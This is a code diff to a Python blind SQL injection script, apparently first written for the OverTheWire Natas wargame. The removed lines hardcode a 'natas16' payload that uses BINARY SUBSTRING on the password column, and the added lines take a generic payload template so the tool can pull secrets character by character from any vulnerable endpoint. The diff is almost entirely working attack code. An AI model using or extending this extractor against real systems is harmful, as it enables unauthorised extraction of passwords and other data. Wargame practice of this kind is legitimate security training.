@@ -21,6 +21,7 @@ def parse_args():
     parser.add_argument("--true-string", required=True, help="String indicating TRUE condition")
     parser.add_argument("--max-length", type=int, default=32, help="Max length of extracted value")
     parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests (seconds)")
+    parser.add_argument("--payload-template", required=True, help="Payload template using {char} and/or {pos}")
 
     return parser.parse_args()
 
@@ -38,11 +39,6 @@ def send_payload(url, auth, param, payload, true_string):
     )
     return true_string in r.text
 
-
-def build_payload(position, char):
-    return f'natas16" AND BINARY SUBSTRING(password,{position},1)="{char}" -- '
-
-
 def extract_secret(args):
     charset = string.ascii_letters + string.digits
     extracted = ""
@@ -53,7 +49,11 @@ def extract_secret(args):
         found = False
 
         for ch in charset:
-            payload = build_payload(pos, ch)
+            payload = args.payload_template.format(
+                char=ch,
+                pos=pos
+            )
+
 
             if send_payload(
                 args.url,
